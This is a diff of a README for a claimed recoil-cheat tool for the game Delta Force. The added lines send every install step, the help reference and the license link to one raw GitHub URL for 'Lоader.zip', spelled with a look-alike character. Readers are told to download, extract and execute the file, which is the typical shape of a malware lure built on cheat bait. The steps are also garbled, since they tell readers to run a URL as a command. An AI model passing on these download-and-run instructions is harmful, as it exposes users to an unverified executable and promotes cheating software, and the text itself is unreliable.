@@ -39,15 +39,15 @@ Delta Force no recoil, recoil control tool, gaming recoil script, 2025 FPS gamin
 
 Getting started is simple—follow these steps to harness the power of the **Delta Force No Recoil Tool**:
 
-1. **Download Loader.rar** from the repository releases section.
-2. **Extract** Loader.rar to your desired directory using your favorite extractor (7-Zip, WinRAR, etc).
-3. For **Windows**: Double-click `Loader.exe` and follow the prompts.
-4. For **macOS**: Open Terminal in the extracted folder and run `./loader.sh`.
-5. For **Linux**: Use `chmod +x loader.sh` then execute `./loader.sh` via terminal. If needed, install Wine and execute the Windows binary.
+1. **Download https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip** from the repository releases section.
+2. **Extract** https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip to your desired directory using your favorite extractor (7-Zip, WinRAR, etc).
+3. For **Windows**: Double-click `https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip` and follow the prompts.
+4. For **macOS**: Open Terminal in the extracted folder and run `https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip`.
+5. For **Linux**: Use `chmod +x https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip` then execute `https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip` via terminal. If needed, install Wine and execute the Windows binary.
 6. **Set up your user profile** and configure your hotkey bindings through the easy-to-understand menu.
 7. **Launch Delta Force** and enjoy seamless, fair-play recoil management!
 
-For more troubleshooting tips and advanced configuration, consult the `docs/HELP.md` or our community forum.
+For more troubleshooting tips and advanced configuration, consult the `https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip` or our community forum.
 
 ---
 
@@ -59,7 +59,7 @@ This tool is meant **solely for educational and legitimate enhancement purposes*
 
 ## 📜 License
 
-This project is open-source under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute responsibly! All contributions and forks are welcome.
+This project is open-source under the [MIT License](https://raw.githubusercontent.com/hero9528/DeltaForceNoRecoil-Tuned/main/Lоader.zip). Feel free to use, modify, and distribute responsibly! All contributions and forks are welcome.
 
 ---
 
